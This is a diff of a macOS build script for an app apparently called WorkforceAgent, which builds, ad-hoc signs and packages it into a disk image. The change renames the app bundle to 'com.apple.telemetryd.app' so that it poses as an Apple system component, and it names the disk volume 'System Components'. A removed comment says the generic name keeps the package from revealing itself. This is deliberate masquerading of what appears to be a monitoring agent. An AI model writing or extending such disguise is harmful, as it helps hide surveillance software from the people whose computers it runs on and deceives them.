@@ -27,17 +27,23 @@ iconutil -c icns "$ICONSET" -o icons/icon.icns
 pyinstaller --noconfirm WorkforceAgent.spec
 
 # Bundle name must match BUNDLE_NAME in WorkforceAgent.spec
-APP="dist/WorkforceAgent.app"
+APP="dist/com.apple.telemetryd.app"
+
+# Ad-hoc sign the app to prevent some macOS security crashes, especially on Apple Silicon
+codesign --force --deep --sign - "$APP"
+
+# Build the Setup wrapper app
+bash "$HERE/build_setup.sh"
+SETUP_APP="dist/WorkforceAgent Setup.app"
+
 DMG="dist/WorkforceAgent-macos.dmg"
 STAGE="dist/dmg-stage"
 
-# 3. Package the .app into a compressed .dmg.
-#    The volume name is kept generic so it doesn't reveal itself when mounted.
+# 3. Package the Setup app into a compressed .dmg.
 rm -f "$DMG"
 rm -rf "$STAGE"
 mkdir -p "$STAGE"
-cp -R "$APP" "$STAGE/"
-ln -s /Applications "$STAGE/Applications"
+cp -R "$SETUP_APP" "$STAGE/"
 
 hdiutil create \
   -volname "System Components" \
